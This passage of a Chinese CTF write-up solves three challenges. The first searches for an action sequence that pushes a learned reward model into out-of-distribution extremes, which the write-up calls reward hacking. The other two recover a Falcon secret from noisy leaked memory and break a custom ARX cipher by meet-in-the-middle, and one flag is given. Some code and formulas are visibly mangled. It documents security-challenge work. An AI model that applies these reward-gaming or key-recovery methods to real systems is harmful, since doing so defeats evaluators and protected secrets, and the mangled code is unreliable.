坐标下降只能到局部最优，所以外层加"踢两脚"，外层循环见第4.3节。

##### 实际收敛过程

从全4出发，记录每一轮的最优值：

```yaml
start   : 170.5084        # 全 4
round 0 : 741.1721        # 第一轮坐标下降就翻了 4 倍多
round 1 : 759.4033
round 5 : 778.4235
round 8 : 780.0279
round 9 : 1054.5375       # 突破 1000
round 10: 1183.2273
round 12: 1239.5614
round 14: 1290.2621       # 收敛
round 15–29: 1290.2621    # 不再提升
```

耗时在分钟级（纯CPU，torch 2.10.0+cpu）。

##### 最优序列

```
BEST = [2,1,2,2,1,0,0,0,3,4,0,0,2,0,2,4,1,0,0,4,2,3,0,3,
        0,2,0,3,3,4,3,2,3,3,3,3,2,2,0,0,0,0,0,0,1,0,0,3]
```

本地 `sum` ：

| 指标  | 值   |
| --- | --- |
| 总和  | **1290.2621** |
| 单步最小 | \-29.09 |
| 单步最大 | **564.45** |
| 单步均值 | 26.88 |
| \>2的步数 | 29 / 48 |
| <0的步数 | 17 / 48 |

单步reward轨迹（前12 /后12）：

```
前 12:  -6.37, 1.25, -8.36, 4.02, 4.22, -3.28, 0.55, 5.41, 9.44, 6.76, 15.59, 31.86
后 12: 526.26, 564.45, -3.74, -9.93, -11.30, -1.38, 18.28, 33.64, 14.72, 43.82, 31.43, 12.79
```

第36、37步reward直接冲到500+—— **隐状态被推到了奖励头的极端区域**，这就是"幻觉"。整条序列并不是全程高奖励，而是先铺垫隐状态，再在末尾引爆。

##### 坐标下降在这里有效的原因

严格说目标并不可分：改第t步会改变 `h_t` 之后的所有隐状态，单步reward之间强耦合，坐标下降没有理论上的收敛保证。但它实践上奏效有两个原因：一是靠前动作的边际影响常被后面的稳态"吸收"，多数单点替换只造成有限扰动，少数替换能把轨迹整体推进新的扇区；二是每轮全扫描192条候选并取全局最优，等价于在48维超立方体网格上做一次"最陡离散下降"，只要存在单点改进就会被接受，不会停在单点平台上。再配合"随机改两个位置后重新下降"的踢动，就能从一个窄峰跳到另一个窄峰。

收敛曲线的形状也印证了这一点：第一轮从170.5跳到741.2，说明全4附近有大量单点改进方向；780附近徘徊几轮，是局部最优之间的平台；第9轮突破1054，是某次踢动把轨迹送进了新扇区；最后稳定在1290.26，连续十几轮踢动都无改进，可以认为在当前邻域结构下已经到顶。

##### 这条序列的分布外

对照常量策略能看得很清楚：常量策略下 `h` 很快收敛到不动点，48步reward基本是同一个数重复；而这条序列动作分布极不均匀，且有成段重复，第36步前后把 `h` 推到了使 `reward_head` 输出500+的位置，这在任何常规策略下都不会出现。世界模型只在有限的策略分布上训练过， `reward_head` 只在见过的 `h` 附近可信；一旦 `h` 离开支撑集，三层MLP就退化为纯线性外推，没有任何校准，输出可以任意大。这正是reward hacking的典型形态——不是策略变好了，而是评分器被绕过了。

#### 提交拿flag

用最优序列拼成一行JSON提交，代码见第4.4节。

```json
{"ok": true, "score": 1290.2773, "flag": "flag{动态容器已脱敏}"}
```

-   服务端 `1290.2773` vs本地 `1290.2621` ，差0.015，是torch版本/浮点差异；
    
-   对照：全4只有 `170.5086` ， **不返flag**，所以阈值在 `(170.5, 1290.3]` 之间（大概率是1000这种整数）。
    

从返回体可以直接读出判定逻辑： `ok` 恒为true， `score` 总是回，只有 `score` 越过阈值时才附带 `flag` 字段。所以整条搜索是"要么过线、要么零分"，900分和7分没有区别；而本题没有任何随机性，同一序列重复提交结果完全一致，这也让"离线算好一条、在线提交一次"成为最优路径。反过来说，只要本地 `sum` 稳定超过疑似阈值，就可以直接提交，不必反复试探服务端——试探一次就够，剩下的交给确定性的打分函数。

#### 解的敏感性

对最优序列做 **单点修改** （只改一个动作），重新评估，得到的分数分布：

| 单点修改后的分数 | 说明  |
| --- | --- |
| 1133.66 | 最好的一步替换，仍掉156 |
| 1041.65 | —   |
| 535.43 | —   |
| 509.37 | —   |
| 229.90 | —   |
| 200.10 | —   |

最优解非常"尖"：任何一个动作改错，分数就从1290掉到几百甚至200。这也解释了为什么梯度/软松弛不work——reward对离散输入的响应是阶跃式的。

### 4\. PoC

```swift
import json, socket
payload = json.dumps({"actions": BEST}, separators=(",", ":"))
s = socket.create_connection(("*", *))
s.sendall((payload + "\n").encode())
print(s.recv(4096).decode())

```

```
a = torch.tensor([[1]*48])
r = imagine(model, a)
r.sum()   # tensor(-63.12187194824219)

```

```python
logits = torch.zeros(T, A, requires_grad=True)
opt = torch.optim.Adam([logits], lr=0.15)

for it in range(600):
    tau = max(0.3, 2.0 * (1 - it / 600))
    soft = F.gumbel_softmax(logits, tau=tau, hard=False, dim=-1)
    idx  = soft.argmax(-1)
    hard = F.one_hot(idx, A).float()
    st   = hard + soft - soft.detach()          # 前向 one-hot，反向走 soft

    h, total = model.initial(1), 0.0
    for t in range(T):
        h = model.step(h, st[t].unsqueeze(0))
        total = total + model.predict_reward(h)

    (-total).backward(); opt.step(); opt.zero_grad()

```

```python
@torch.no_grad()
def batch_score(seqs):                 # seqs: (B, 48) long
    B = seqs.shape[0]
    h = torch.zeros(B, 384)
    total = torch.zeros(B)
    for t in range(48):
        h = model.gru(F.one_hot(seqs[:, t], 5).float(), h)
        total += model.reward_head(h).squeeze(-1)
    return total                        # (B,)

def coordinate_descent(start):
    cur = list(start)
    cur_s = score1(cur)
    improved = True
    while improved:
        improved = False
        cand = []
        for t in range(48):
```

* * *

## Misc6-问卷调查

完成问卷星：<靶机地址>

* * *

## Crypto1-frozen

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Crypto |
| 形态  | 混合题（附件+容器） |
| 附件  | frozen_02136a685ccd425e537aa0735795019f.zip，解压得task.py |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

官方题面只给出附件下载链接，没有任何文字提示，所有信息都要从 `task.py` 与服务输出里读。

### 2\. 题目分析

#### 服务端流程

`task.py` 先跑一遍NTRU/Falcon风格的密钥生成，再用密钥的“自相关多项式” `D` 派生对称密钥，把真实flag加密后输出。核心步骤：

1.  `keygen(N=128, q=12289, sigma=19.16)` 采样高斯多项式 `f, g` （系数标准差19.16），用塔式扩展欧几里得解出 `F, G` ，满足
    
    \[ fG-gF=q, \]
    
    再做Babai约化控制 `F, G` 的范数，最后算出公钥
    
    \[ h=g\\cdot f^{-1}\\bmod q. \]
    
2.  真正的秘密量是
    
    \[ D=f\\cdot\\mathrm{adj}(f)+g\\cdot\\mathrm{adj}(g), \]
    
    其中 `adj` 是负循环伴随（ `adj(a) = [a0, -a_{N-1}, ..., -a_1]` ），所以 `D` 就是 `f` 与 `g` 的负循环自相关之和，系数为整数且很小。
    
3.  `D` 按十进制、逗号连接后取 `fk = sha256(b"frozen:" + canon)` ，密钥流为 `sha256(fk || counter)` 逐块拼接，异或flag得到 `flag` 字段。
    
4.  打印 `pubkey` （含 `h` 与 `rho_hint` ）、 `memory` （泄露的双精度浮点块）、 `flag` （密文）。
    

：只要能还原整数多项式 `D` ，就能算出 `fk` 、解出flag，完全不需要求 `f, g` 。

把四个多项式都看成商环 `R_q = Z_q[x]/(x^N+1)` 里的元素，这套记号会更清楚：负循环乘法中 `x^N = -1` 、 `x^{-1} = -x^{N-1}` ，所以 `adj(a)` 正是 `a` 在环内的共轭（把 `x` 换成 `x^{-1}` ），于是

\[ D=a\\cdot\\overline{a}+b\\cdot\\overline{b} \]

就是 `f` 与 `g` 的负循环自相关之和，而不是别的什么“派生量”。再看密钥关系：矩阵 `[[g,-f],[G,-F]]` 的行列式恰为 `q` ，它把 `(f,g)` 送到 `(q,0)` ，因此公钥 `h=g/f` 只是这个矩阵一行信息的投影，128个模 `q` 系数里没有 `D` 的直接痕迹； `D` 只活在整数域。其系数量级为 `sqrt(N)·sigma² ≈ 4.3×10³` ，而 `D[0]=|f|²+|g|² ≈ 2N sigma² ≈ 9.4×10⁴` ，全都远在 `2^53` 以内，双精度可以逐个精确表示——这既是“取整即得”的前提，也是后面用叶子中位数估计绝对尺度的依据。

#### Falcon树的中间量

`expanded_doubles()` 先算四个谱 `fh, gh, Fh, Gh` ，再构造Falcon的LDL树：

```
G00 = gh*conj(gh) + fh*conj(fh)
G01 = gh*conj(Gh) + fh*conj(Fh)
G11 = Gh*conj(Gh) + Fh*conj(Fh)
Ltop = G01 / G00
Dright = G11 - Ltop*conj(Ltop)*G00
return [Ltop, _T(G00), _T(Dright)]
```

`_T(E)` 递归做“折半+归一化”：

```
Ee, Eo = splitfft(E)          # Ee=(E[:h]+E[h:])/2, Eo=(E[:h]-E[h:])/(2*rho)
L = conj(Eo) / Ee
return [L, _T(Ee), _T(Ee - L*conj(L)*Ee)]
```

关键性质：

-   `G00` 就是 `D` 在2N次单位根上的取值（ `G00(ζ) = D(ζ)` ），所以 `D` 是 `G00` 的逆NTT；
    
-   `Dright` 由Falcon关系满足 `Dright = q² / G00` ，因此两个子树其实是同一个 `D` 的两种镜像表示；
    
-   树的每个内部节点只存一个 `L` ，它编码了两个孩子谱的比值，本身不含量纲；绝对尺度由叶子给出。
    

#### G00与D的关系

设 `ζ` 是2N次本原单位根， `fh(ζ)=Σ_j f_j ζ^j` 。因为 `ζ^N = -1` ，有

\[ \\overline{fh(\\zeta)}=\\sum_j f_j\\zeta^{-j}=\\sum_j f_j \\zeta^{N-j}=\\mathrm{adj}(f)(\\zeta), \]

于是

\[ G\_ 00}(\\zeta)= fh(\\zeta)|^2+|gh(\\zeta)|^2 =f(\\zeta)\\mathrm{adj (f)(\\zeta)+g(\\zeta)\\mathrm{adj}(g)(\\zeta)=D(\\zeta). \]

`G00` 在 `ζ^k (k=0..N-1)` 上的N个取值正好是 `D` 的N点NTT，所以做一次逆变换就能取回 `D` 的整数系数。

再看 `Dright` 。令

\[ S=

, \]

由 `fG-gF=q` 得 `det S = q` ，于是Gram矩阵

\[ SS^{\\mathsf T}=

\]

的行列式为 `q²` 。因此

\[ G\_{00}G\_{11}-G\_{01}^2=q^2 \\quad\\Longrightarrow\\quad D\_{\\text{right}}=G\_{11}-\\frac{G\_{01}^2}{G\_{00}}=\\frac{q^2}{G\_{00}}. \]

这条恒等式把左右两棵子树绑定在一起：左树给出 `G00` ，右树给出 `q²/G00` ，两者是同一组未知量的两次独立观测。拟合时把右树的模型写成 `2·log q - z` （ `z` 是左树 `log G00` 的参数），等价于同时使用两份数据。

#### 序列化布局与被删掉的头

`expanded_doubles()` 的写入顺序是： `fh` 、 `gh` 、 `Fh` 、 `Gh` （每个2N个double）→先序遍历的内部节点→叶子（实部标量）。

但服务端在输出前砍掉了头部：

```
head = 8 * 128
cblob = cblob_full[head * 8:]
```

即丢掉前 `8*N = 1024` 个double，正好是四个谱（4×2N=8N）。剩下的 `memory` 布局为：

| 段   | double数 | 说明  |
| --- | --- | --- |
| `Ltop` | `2N = 256` | 根节点，N个复数（实部、虚部交错） |
| 左树内部节点 | `N*log2(N) = 896` | 先序，每层节点存 `h` 个复数 |
| 右树内部节点 | `896` | 同上  |
| 左树叶子 | `N = 128` | 实标量 |
| 右树叶子 | `N = 128` | 实标量 |
| 合计  | `2304` | 18432字节 |

所以按下面的方式切分就能还原出两棵树的观测：

```toml
internal = n * (n.bit_length() - 1)
obs   = np.r_[mem[2*n:2*n+internal],  mem[-2*n:-n]]        # 左树内部 + 左叶子
right = np.r_[mem[2*n+internal:2*n+2*internal], mem[-n:]]  # 右树内部 + 右叶子
```

#### 节点L的编码内容

一次 `splitfft` 把长度 `m` 的谱 `E` 拆成偶数位与奇数位两组， `h=m/2` ， `rho_j = exp(iπ(2j+1)/m)` 。记两个孩子谱为 `a=Ee` 、 `b=Eo` ， `_T` 里存的节点值是

\[ L=t\\cdot\\rho,\\qquad t=\\frac{a-b}{a+b}. \]

因为 `|ρ|=1` ，从 `L` 立刻得到 `t = L\cdot\bar\rho` ，进而

\[ \\frac{b}{a}=\\frac{1-t}{1+t}. \]

`L` 只描述“右子与左子的比值”，不携带任何绝对大小；把80个内部节点全部读完，也只能确定谱的相对形状，最后必须靠叶子（ `E` 的实部标量）定标。这正是拟合时“内部节点权重0.25、叶子权重取叶子中位数”的原因。

#### 噪声模型：位翻转而不是加性高斯

`corrupt_blob()` 对每个double的bit 0..55以及bit 63做翻转：

```
flipbits = list(range(56)) + [63]
## 当前位为 1 时以 rho10=0.01 翻成 0；为 0 时以 rho01=0.001 翻成 1
```

这带来两类误差：

-   bit 0..55：只动尾数低位，相对误差极小（ `~2^-56` 量级），属于“几乎无损”的抖动；
    
-   bit 63：符号位翻转，数值直接变成相反数，属于粗大误差（gross outlier）。
    

粗差在 `L` 上有一个可检测的特征：正常的 `|t| ≤ 1` ，而 `|ρ|=1` ，所以物理上必须 `|L| ≤ 1` ；一旦符号被翻， `L` 变成 `-L` ，模长仍小于1却指向反方向，或者与 `|L|>1` 的数值一起出现。拟合时把 `|L|>1.01` 和非有限值直接屏蔽，再用 `soft_l1` 损失压制残余的离谱点，就能把翻转样本的影响压到可忽略。

冗余还来自树本身：深度 `d` 的节点有 `2^d` 个，每个节点在同一个下标 `j` 上都存了一份 `L` ，同一位置的比值被重复测量了 `2^d` 次；再加上右树的镜像观测，总共2304个double全部进入拟合。

不过“只动尾数低位”说的是最常见的情形： `bit48` ~ `bit55` 落在尾数高位甚至指数区，一位翻转就能把该double抬高或压低几倍，概率虽低，量级上却与符号翻转同属粗差。所以噪声整体是重尾的，既不是干净的高斯，也不是单纯的全有全无，鲁棒损失加掩码这两手必须同时具备。

#### 自由度与冗余度

未知量只有 `n/2 = 64` 个实数（ `G00` 的共轭对称把128个谱点砍半），观测却有 `2304` 个double。256个double给出根节点与下一层的 `L` ，越往深层节点越短但数量越多，每个下标上的同一比值都有 `2^d` 份副本；再叠加右树的 `q²/G00` 镜像，等于同一组未知量被独立测量了两遍，整体冗余度约 `2304/64 = 36` 。冗余带来两个好处：任何单个double被毁（非有限、符号翻转、高位翻转）都不致命，去掉它仍有大量同位置副本可用；拟合残差因而能被压到 `1e-10` 量级，让 `rint` 的余量远小于 `0.05` 的判据。

### 3\. 解题过程

#### 把整棵树参数化成n/2维

不要逐层手工合并，而是把 `log` 域的谱值 `z` （ `n/2 = 64` 维）当作未知量，用树的结构正向生成全部观测。因为 `G00` 是实多项式 `D` 在单位根上的取值，它满足共轭对称 `E(ζ^{N-j}) = conj(E(ζ^j))` ，所以只需要64个自由度：

```
idx = np.minimum(np.arange(n), n-1-np.arange(n))
E   = np.exp(z[idx])            # 把 64 维参数镜像成 n 维谱
```

给定父谱 `E` ，两个孩子由 `splitfft` 决定。反过来，若已知孩子 `a, b` ，则

```
A = (a+b)/2;  t = (a-b)/(a+b);  L = t*rho
B = A*(1 - t*t)
```

即：只要给出 `n/2` 个谱值，整棵树（所有层的 `L` 与所有叶子）都能确定。于是“恢复 `D` ”变成一个只有64个未知量、2304个观测的非线性最小二乘问题。

选 `log` 域而不是直接拟合谱值，原因有三：谱值恒正且动态范围有 `1e5` 量级，取对数后各分量才在差不多的尺度上，优化器的步长不必为最亮的点和最暗的点分别妥协； `exp` 保证参数化后的谱永不越过零点，避免 `t=(a-b)/(a+b)` 在 `a+b→0` 处爆炸；而单调变换不改变极小点， `z` 到每个观测的雅可比仍可由链式法则解析写出，不必退回数值差分。

#### 稳健最小二乘

残差按段加权：内部节点的误差尺度取0.25（ `L` 的量级就是1，0.25已经是宽松上界），叶子的尺度取叶子观测的中位数（叶子是绝对量，量级差很多）。同时屏蔽非有限值与非物理值（ `|L| > 1.01` ）。

权重要与掩码严格同步：同一个 `mask` 必须同时作用在观测、尺度和雅可比的行上，否则残差向量与雅可比的行数会对不上。 `bounds` 把 `z` 限制在 `log(scale0) ± 8` ，即谱值允许在两个数量级内浮动：下界防止某个分量被粗差推到0附近（ `log` 发散），上界防止个别点吞掉全部能量；初值取全 `log(scale0)` ，等于先假设谱是平的，让优化器自己长出不均匀性。

右树用镜像模型 `2*log(q) - z` ，对 `z` 的雅可比取负号：

```
rv, rj = tree_model(2*np.log(q) - z)
v = np.r_[v, rv]; j = np.r_[j, -rj]
```

这样一次调用就同时拟合了左树与右树。

求解器用 `scipy.optimize.least_squares` 配 `loss='soft_l1'` ， `f_scale` 从 `1e-2` 逐步收紧到 `1e-10` ：

```
for fs in [1e-2, 1e-4, 1e-6, 1e-8, 1e-10]:
    sol = least_squares(..., loss='soft_l1', f_scale=fs, max_nfev=150, ...)
    z = sol.x
```

为什么要分级？ `soft_l1` 在大 `f_scale` 下近似L1损失，对符号位翻转造成的整段误差不敏感，先把解拉到正确盆地；随后逐步减小 `f_scale` ，损失趋近L2，用剩余的干净样本把解精修到1e-10量级。若一上来就用L2，几个 `-L` 的粗差足以把解拖偏。

雅可比是手工推导而非数值差分：对 `A=(a+b)/2` 、 `t=(a-b)/(a+b)` 、 `B=A(1-t²)` 三式求导，得

\[ J_A=\\frac{j_a+j_b}{2},\\quad J_t=\\frac{(j_a-j_b)-t,(j_a+j_b)}{a+b},\\quad J_B=J_A(1-t^2)-2At,J_t, \]

再乘上 `rho` 的对角项与 `exp(z[idx])` 的对角项，就得到每个观测对64个参数的偏导。右树把 `q²/G00` 写成 `2log q - z` 后，链式法则只多一个负号， `J` 整体取反即可，两份数据的雅可比在同一轮里拼起来，避免了两次独立求解可能落到不同局部极小。

#### 逆变换与取整

收敛后把 `z` 镜像成 `spec = exp(z[...])` ，再做逆NTT。注意 `G00` 是在 `ζ^k` （2N次根）上采样、而 `D` 是负循环多项式，所以逆变换要带一个半格相位因子：

```
D = np.fft.fft(spec) / n * np.exp(-1j*np.pi*np.arange(n)/n)
```

那个相位因子不是凑出来的： `G00` 采样在 `zeta_j = exp(iπ(2j+1)/N)` 上，也就是2N次本原根只取奇数次幂，而还原 `D` 需要偶数次幂的均匀网格。 `zeta_j^{-k}` 里多出的 `exp(-iπk/N)` 正好补上这半个格子的偏移，所以写成 `exp(-1j*pi*arange(n)/n)` ；若直接调用普通的逆NTT，结果会整体错位半格，每个系数都偏一点，自相关结构也随之破坏。

理论上 `D` 的系数是整数，实测虚部与小数部分都在1e-10量级，直接 `np.rint(D.real)` 即可。为了不把错误结果当答案，脚本做两道保险：

1.  取整误差 `max|raw - rint(raw)| < 0.05` ，否则拒绝解密；
    
2.  自伴随校验 `D[n/2]=0` 且 `D[i] = -D[n-i]` ，这是 `D = f·adj(f) + g·adj(g)` 必然具备的对称性。
    

#### 从D到flag

```
canon = ','.join(map(str, D)).encode()
fk = sha256(b'frozen:' + canon).digest()
pt = bytes(a ^ b for a, b in zip(ct, keystream(fk, len(ct))))
```

这里必须注意三点，任何一处不同都会解出乱码：

-   `D` 必须是整数且按 `str(int)` 、逗号无空格连接；
    
-   前缀固定为 `b'frozen:'` ；
    
-   计数器是4字节大端。
    

密钥流的生成为

\[ \\mathrm{ks} *i=\\mathrm{SHA256}(\\mathrm{fk}\\parallel i* {32,\\text{BE}}),\\quad i=0,1,\\dots \]

拼接后截断到密文长度。

密文字段是十六进制，长度即明文长度；每32字节一个块，最后一块按需截断，块内不再做任何填充。解密结果应当是可打印ASCII且以 `flag{` 开头，这个检查比任何概率判据都直接：只要 `D` 错了一个系数， `fk` 就完全不同，输出会整体变成随机字节。反过来，一旦看到 `flag{` ，基本可以断定 `D` 的128个整数全部正确——SHA-256把任何一位错误都放大成了全文不可读。

#### 用公钥独立复核

若不想只依赖“取整误差小”这一条判据，还可以从 `h` 独立地把密钥捞回来做交叉验证。构造 `2N×2N` 的NTRU格基

```
[ I  H ]
[ 0 qI ]
```

其中 `H` 是 `h` 的负循环卷积矩阵。这个格子里同时含有 `(f, g)` 及其全部旋转，该行范数约 `sqrt(2N)·sigma ≈ 217` ，与 `q=12289` 相比小得多，LLL就能把它直接拉出来。对候选行做系数居中（映到 `[-q/2, q/2]` ），检查 `h·f ≡ g (mod q)` 且最大系数在合理范围内，再用 `D = f·adj(f) + g·adj(g)` 重算一遍。两条完全独立的路径给出同一个 `D` ，才说明整条反演链没有踩到数值巧合；N=128时LLL只需几秒，BKZ仅在极端实例上才有必要。

### 4\. PoC

```python
## 关键代码：Falcon树模型与最小二乘恢复
def tree_model(z, jac=False):
    """Preorder serialization of the Falcon LDL tree for a spectrum exp(z)."""
    n = 2 * len(z)
    idx = np.minimum(np.arange(n), n - 1 - np.arange(n))
    E = np.exp(z[idx])
    J = E[:, None] * np.eye(n // 2)[idx]
    vals, deriv, leaves, dl = [], [], [], []

    def rec(E, J):
        m = len(E)
        if m == 1:
            leaves.append(E)
            dl.append(J)
            return
        h = m // 2
        a, b = E[:h], E[h:]
        ja, jb = J[:h], J[h:]
        A = (a + b) / 2
        JA = (ja + jb) / 2
        t = (a - b) / (a + b)
        JT = ((ja - jb) - t[:, None] * (ja + jb)) / (a + b)[:, None]
        rho = np.exp(1j * np.pi * (2 * np.arange(h) + 1) / m)
        L = t * rho
        vals.extend([L.real, L.imag])
        deriv.extend([JT * rho.real[:, None], JT * rho.imag[:, None]])
        B = A * (1 - t * t)
        JB = JA * (1 - t * t)[:, None] - 2 * (A * t)[:, None] * JT
        rec(A, JA)
        rec(B, JB)

    rec(E, J)
    return np.concatenate(vals + leaves), np.concatenate(deriv + dl)

def recover(obs, n=128, verbose=False, right=None, q=12289):
    # Internal nodes encode spectral ratios; leaves determine absolute scale.
    scale0 = np.median(obs[-n:][(obs[-n:] > 100) & (obs[-n:] < 1e8)])
    ifnot np.isfinite(scale0):
        raise ValueError('No usable leaves')
    scales = np.r_[np.full(len(obs) - n, .25), np.full(n, scale0)]
    limits = np.r_[np.full(len(obs) - n, 1.01), np.full(n, scale0 * 100)]
    if right isnotNone:
        rscale = np.median(right[-n:][(right[-n:] > 0) & (right[-n:] < 1e8)])
        scales = np.r_[scales, np.full(len(right) - n, .25), np.full(n, rscale)]
        limits = np.r_[limits, np.full(len(right) - n, 1.01), np.full(n, rscale * 100)]
```

* * *

## Crypto2-vmshare

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Crypto |
| 形态  | 附件题 |
| 附件  | vmshare_6d3416fb746f85cad8020e41571f8b7b.zip，内含encryptor与cipher.bin |
| 目标  | 无（离线附件） |

Flag：flag{3174812_31af718}

附件两个文件： 题目是一个自定义ARX分组密码：16条 `uint16` lane、每段8轮、两段28 bit密钥。目标是逆推 `cipher.bin` 对应的原始输入。

### 2\. 题目分析

`main` 位于 `0x1eb0` ，整体流程是“读入并校验→解析两段整数→两轮分组加密→输出32字节”。

#### encryptor的整体结构

`encryptor` 只是一层很薄的命令行包装：把输入的flag文本切成两段十六进制数，调用同一套核心例程完成两轮分组加密，再 `write` 出32字节。程序里没有网络、没有随机数、也不读取时间，因此 `cipher.bin` 是一个确定性的函数值。这一点决定了整道题的本质是“求一个公开函数的原像”，而不是猜测某个隐藏状态或外部密钥。

反汇编中编译器把单条lane的运算全部展开成256 bit向量指令（ `vpsllw` / `vpsrlw` / `vpaddw` / `vpxor` ），一次处理16条 `uint16` 。这不是虚拟化或解释器，而是刻意让题目看起来像一台小型SIMD机器：

| 设计点 | 具体取值 | 作用  |
| --- | --- | --- |
| 分组长度 | 16 lane × 16 bit = 256 bit | 与一个AVX2寄存器等宽 |
| 轮数  | 每段8轮，共16轮 | 短到可以手工跟踪 |
| 密钥  | 两段各28 bit，实际各24 bit | 单段穷举可行 |
| 每轮结构 | 循环移位+模加+两次异或右移 | 全部可逆 |

“两段28 bit密钥”来自flag文本里两段7位十六进制；但密钥扩展第一行就写了 `v & 0xffffff` ，真正进入运算的只有24 bit。这个截断既是出题人留的“可解”口子，也是后面flag多解性的根源。

#### 输入校验

从 `argv[1]` 或 `flag.txt` 读取输入，并检查：

-   总长度为 `0x15` （21字符）；
    
-   以 `flag{` 开头， `flag[20] == '}'` ；
    
-   `flag[12] == '_'` ；
    
-   `flag[5..11]` 和 `flag[13..19]` 都是十六进制字符，且大小写均可。
    

#### 密钥扩展

将下划线两侧的7个字符分别交给 `strtoul(s, 0, 16)` ，得到两段28 bit整数，再对每段调用 `sub_1c60(v, seed)` 生成8个16-bit轮密钥。两段使用的seed分别是：

-   第一段： `0x31415926`
    
-   第二段： `0x27182818`
    

密钥扩展的核心代码：

```powershell
h = (v & 0xffffff) ^ seed;                  // 只保留低 24 bit
h ^= h >> 13;
h *= 0x45d9f3b;
h ^= h >> 16;                               // murmur3 finalizer

for (i = 0; i < 8; i++) {
    h  = h + i * 0x7f4a7c15 + 0x9e3779b9;
    h2 = h;
    h2 ^= h2 >> 13;
    h2 *= 0x85ebca6b;
    h2 ^= h2 >> 16;
    key[i] = (h2 ^ (h2 >> 16)) & 0xffff;
    h = h2;
}
```

这里有两个细节值得记住：

-   `v & 0xffffff` 把每段输入截成24 bit，所以7位十六进制的最高4 bit对轮密钥没有任何影响；
    
-   第 `i` 轮先把常数 `i*0x7f4a7c15 + 0x9e3779b9` 加进状态，再做一次murmur3 finalizer（乘 `0x85ebca6b` ），取低16位作为轮密钥；下一轮的起点是本次的 `h2` ，因此8个轮密钥彼此串联。
    

#### 轮函数与整体结构

加密状态初始化为 `0xa80` 处的32字节常量：

```
SIMD_TINY_BLOCK_IS_A_NIGHTMARE!!
```

这32字节被解释为16条小端 `uint16` lane：

```
0x4953 0x444d 0x545f 0x4e49 0x5f59 0x4c42 0x434f 0x5f4b
0x5349 0x415f 0x4e5f 0x4749 0x5448 0x414d 0x4552 0x2121
```

紧挨着状态常量之前（偏移 `0xa60` ）还有一张32字节的lane常量表，按小端解释为16个 `uint16` ：

```
0x1357 0x2468 0x369c 0x48ad 0x5be1 0x6cf2 0x7d03 0x8e14
0x9f25 0xa036 0xb147 0xc258 0xd369 0xe47a 0xf58b 0x069c
```

随后执行两次 `sub_1cc0` ，分别使用X、Y两段的密钥。每轮中16条lane相互独立，单条lane的变换为：

```
x ^= x >> 5                         // 每次调用 sub_1cc0 时先执行一次
b = rol16(x, 3)
y = (key[i] + C_lane + b) mod 2^16
y ^= y >> 7
y = rol16(y, 9)
y ^= y >> 5                         // 第 8 轮省略
x = y
```

因此整体加密过程可以表示为：

```
C = R(K(Y), R(K(X), S))
```

其中 `S` 是初始状态， `X` 、 `Y` 是两段输入解析出的整数， `K(·)` 是密钥扩展， `R(·)` 是8轮变换。两次调用各自都带开头那次 `x ^= x >> 5` 。把上面这套结构与 `cipher.bin` 对照，用已知明文 `flag{...}` 跑一遍即可逐字节复现密文 `e717f224...537527` ，说明反汇编得到的常量与运算顺序都是对的。

#### 三个可利用的结构性质

把轮函数放在一起看，可以得到三条互相独立的结论，第3节的整条攻击链都建立在这三条上：

1.  **lane之间完全解耦。** 轮函数里唯一与lane下标相关的是常量 `C_j` ，它是按位置固定的，不含数据依赖。因此16条lane等价于16个互不通信的16 bit小密码，共享同一组轮密钥。
    
2.  **每段加密是双射。** 单轮由 `rol3` 、模加、 `y ^= y >> 7` 、 `rol9` 、 `y ^= y >> 5` 组成，五个操作都是 `GF(2)^16` 上的可逆映射，复合后仍是双射。加上开头那次 `x ^= x >> 5` ， `R(K, ·)` 整体可逆，逆函数存在且唯一，这正是反向枚举Y段的前提。
    
3.  **密钥空间被压到 `2^24` 。** 因为 `& 0xffffff` ，X、Y各自只有 `2^24` 种可能的轮密钥序列，且映射 `v → K(v)` 可以被完整枚举。
    

顺带得到一个推论：由于 `K(·)` 只依赖低24 bit，密文对7位十六进制数的最高半字节完全不敏感，所以解出的X、Y只能确定到低24 bit，flag写法天然不唯一。这一点会在3.4节量化。

### 3\. 解题过程

#### 单lane可逆

由于各lane相互独立，给定密钥后，单lane的每一轮都可以逆运算：

-   `y ^= y >> n` 可以通过连续异或 `y >> n, y >> 2n, ...`还原（右移后高位补0，迭代 `16/n+1` 次即收敛）；
    
-   循环左移对应循环右移；
    
-   模加对应模减。
    

于是正向一轮可以写成

\[ z=(\\mathrm{rol}\_3(x)+k_i+C)\\bmod 2^{16},\\quad w=z\\oplus(z\\gg 7),\\quad y=\\mathrm{rol}\_9(w), \]

最后一轮之外再补一步 `y ^= y >> 5` 。反向只需按相反顺序做“去末尾异或→右旋9→去异或7→减密钥与常量→右旋3”。

去异或右移之所以能用迭代收敛，是因为 `x ^ (x >> n)` 是一个上三角线性变换：最高的 `n` 个bit保持不变，随后每一位只依赖比它更高的位。因此 `unxor_r(y, n)` 从 `x = y` 出发，每迭代一次就多修正 `n` 个bit， `16/n + 1` 次后必然稳定（ `n=5` 时4次， `n=7` 时3次）。这保证反向过程是精确的，不涉及任何近似或暴力猜测。

另一个有用的观察是：由于lane独立，正向和反向都不必算完全部16条lane。给定密钥后，第 `j` 条lane的演化只用到 `key[i]` 和 `C_j` ，与其他lane的中间值无关。这为下文的“部分指纹匹配”提供了合法性——截取前3条lane不是启发式剪枝，而是严格无损的局部计算，只要这段局部结果匹配，整段密钥就必然被唯一确定（至多差一个待排除的碰撞）。

#### 3-lane meet-in-the-middle

密钥只有24 bit有效位，所以正向空间是 `2^24` ；反向从密文出发的空间同样只有 `2^24` 。直接枚举 `2^48` 不可行，但lane之间互不影响，可以只比较前3条lane组成的48 bit指纹：

1.  正向枚举 `2^24` 个X，计算 `R(K(X), S)` 的前3条lane，拼成48-bit指纹并排序；
    
2.  反向枚举 `2^24` 个Y，从密文计算 `R⁻¹(K(Y), C)` 的前3条lane，拼成同样的指纹；
    
3.  在正向表中二分查找对应指纹。
    

随机假匹配的期望数量为

\[ \\frac{2^{24}\\cdot 2^{24}}{2^{48}}=1, \]

所以前3条lane足够定位唯一解；命中后再用完整的16条lane重新加密一次做最终确认。总代价从 `2^48` 降到 `2^25` 量级的计算，用 `numpy` 分块向量化后在普通单机上几分钟内即可跑完。

